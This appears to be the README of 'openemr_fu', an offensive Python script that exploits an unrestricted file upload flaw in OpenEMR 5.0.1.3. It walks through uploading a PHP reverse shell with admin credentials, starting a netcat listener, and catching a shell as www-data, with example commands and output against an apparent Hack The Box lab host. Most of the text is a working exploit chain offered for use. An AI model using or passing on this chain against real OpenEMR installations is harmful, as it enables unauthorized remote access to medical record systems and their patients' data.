# openemr_fu
Script to facilitate OpenEMR 5.0.1.3 exploitation via an unrestricted File Upload vulnerability 

Step 1: Create a PHP Reverse shell

Step 2: Set up your listener

Step 3: Run openemr_fu

Options:
```
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        Target host
  -u USER, --user USER  OpenEMR Username
  -p PASSWORD, --password PASSWORD
                        OpenEMR password
  -r REVERSE_SHELL, --reverse_shell REVERSE_SHELL
                        Select PHP reverse shell to upload
```

Example:
```
python3 openemr_fu.py -t http://hms.htb -u openemr_admin -p password -r /root/Downloads/ws1.php
[*] Authenticating with user: openemr_admin to http://hms.htb/interface/main/main_screen.php?auth=login&site=default
[*] Uploaded /root/Downloads/ws1.php to http://hms.htb/interface/super/manage_site_files.php in directory: /sites/default/images/
[*] Contacting reverse shell page at: /sites/default/images/ws1.php
```

Receiving the shell: 
```
root@kali:~# nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.54] from (UNKNOWN) [10.10.10.188] 53120

whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
